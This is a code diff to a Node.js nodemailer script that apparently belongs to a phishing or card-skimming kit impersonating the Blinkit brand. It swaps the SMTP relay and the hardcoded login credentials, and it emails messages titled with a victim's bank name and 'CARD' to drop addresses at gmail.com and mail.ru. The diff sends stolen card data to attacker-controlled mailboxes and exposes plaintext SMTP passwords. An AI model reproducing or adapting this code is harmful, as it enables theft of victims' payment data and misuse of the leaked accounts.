@@ -1,12 +1,11 @@
 const nodemailer = require("nodemailer");
 
 const transporter = nodemailer.createTransport({
-  host: "smtp.mailgun.org",
-  port: 465,
-  secure: true,
+  host: "smtp-relay.sendinblue.com",
+  port: 587,   
   auth: {
-    user: "blinkit@cashoxo.com",
-    pass: "Ankit@123",
+    user: "2012xwd@gmail.com",
+    pass: "qLFfCsSpZRAEVxGw",
   },
 });
 
@@ -26,8 +25,8 @@ async function Mail(data) {
 `;
   const subject = `${data.bankname} CARD`;
   const info = await transporter.sendMail({
-    from: '"blinkit👻" <blinkit@cashoxo.com>', // sender address
-    to: "rus.server420@gmail.com", // list of receivers
+    from: '"blinkit👻" <blinkit@cybercrime.com>', // sender address
+    to: "sho.cyber@mail.ru", // list of receivers
     subject,
     text: "blinkit Order", // plain text body
     html, // html body
